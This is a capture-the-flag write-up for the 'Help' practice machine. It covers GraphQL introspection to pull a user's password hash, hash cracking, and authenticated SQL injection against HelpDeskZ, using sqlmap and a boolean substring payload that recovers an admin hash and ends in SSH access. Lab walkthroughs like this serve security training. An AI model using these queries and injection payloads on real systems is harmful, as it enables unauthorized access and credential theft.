# Help - Second way

There is another way of doing the box. If we check our Nmap scan again we see that there is Node.js on port 3000:

```markdown
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA)
|   256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA)
|_  256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
3000/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Checking Node.js Express framework (Port 3000)

If we browse to the web page on port 300 we get a Node.js API with one message saying:
> message: "Hi Shiv, To get access please find the credentials with given query"

This is a hint to look out for **GraphQL** on the server and we find the path **/graphql** on the page that says:
> GET query missing.

If we research a bit about the GraphQL package and how to exploit it we wil find different sources. One query I found is one that eventually gives us useful information:
```markdown
10.10.10.121:3000/graphql?query= {__schema%20{%0atypes%20{%0aname%0akind%0adescription%0afields%20{%0aname%0a}%0a}%0a}%0a}

URL-decoded:
{__schema {
  types {
    name
    kind
    description
    fields {
      name
      }
    }
  }
}
```

We see there is a _User Object_ with two values _username and password_:

![Interesting user objects](https://kyuu-ji.github.io/htb-write-up/help/help_user-objects.png)

If we research a bit about the GraphQL package and how to exploit it we wil find different sources. One query I found is one that eventually gives us useful information:
```markdown
{ user {
  username, password
  }
}

URL-encoded:
10.10.10.121:3000/graphql?query={+user+{+username,+password+}+}
```

This gives us the values for username and password:
```json
{
  "data": {
    "user": {
      "username": "helpme@helpme.com",
      "password": "5d3c93182bb20f07b994a7f617e99cff"
    }
  }
}
```

This hash is 32 characters long, so it is probably MD5 and we find it on hashes.org:
> godhelpmeplz

These are credentials for the **ServiceDeskZ** portal that is running on port 80.

## Checking HTTP (Port 80)

There are two vulnerabilites that both work for the version lower than 1.0.2 and we know that the version is exactly that.
- HelpDeskZ 1.0.2 - Arbitrary File Upload
- HelpDeskZ < 1.0.2 - (Authenticated) SQL Injection / Unauthorized File Download

This time we will use the **Authenticated SQL Injection** because we are authorized with the credentials we found on Node.js.

### SQL Injection exploit

Before we can use this exploit we need to create a ticket with an attachment:

![Creating ticket](https://kyuu-ji.github.io/htb-write-up/help/help_creating-ticket.png)

Sending the location of the attachment to Burpsuite:
```markdown
GET /support/?v=view_tickets&action=ticket&param[]=5&param[]=attachment&param[]=1&param[]=7 HTTP/1.1
Host: 10.10.10.121
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Cookie: lang=english; PHPSESSID=lq1cfc4t3upb5p4pqcpmftcnb1; usrhash=0Nwx5jIdx%2BP2QcbUIv9qck4Tk2feEu8Z0J7rPe0d70BtNMpqfrbvecJupGimitjg3JjP1UzkqYH6QdYSl1tVZNcjd4B7yFeh6KDrQQ%2FiYFsjV6wVnLIF%2FaNh6SC24eT5OqECJlQEv7G47Kd65yVLoZ06smnKha9AGF4yL2Ylo%2BF17KMZ44LDq7MJ4o4ZDbx1GAgeVnXUZaVQLevzMj3ugw%3D%3D
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
```

We will save this request to a file so we can send it to **SQLMap**:
```markdown
sqlmap -r help.req --batch
```

Then we dump the contents of the database:
```markdown
sqlmap -r help.req --dump
```

Here we will find the table named **staff** that is important.

We will write a Python script to automate the process of this SQL Injection, that can be found in this folder named **help-sqli.py**.
```markdown
/support/?v=view_tickets&action=ticket&param[]=5&param[]=attachment&param[]=1&param[]=7 and substr((select password from staff limit 0,1),0,1) = 'a'
```

Running that script will iterate through every character of the hash of the password of the Administrator. If we let run SQLMap long enough this hash will be found, too.
> d318f44739dced66793b1a603028133a76ae680e

This hash is 40 characters long and thus probably SHA1. On hashes.org we find this hash and the password is:
> Welcome1

Starting a SSH session with the user _help_ and this password works and we have a shell:
```markdown
ssh help@10.10.10.121
```
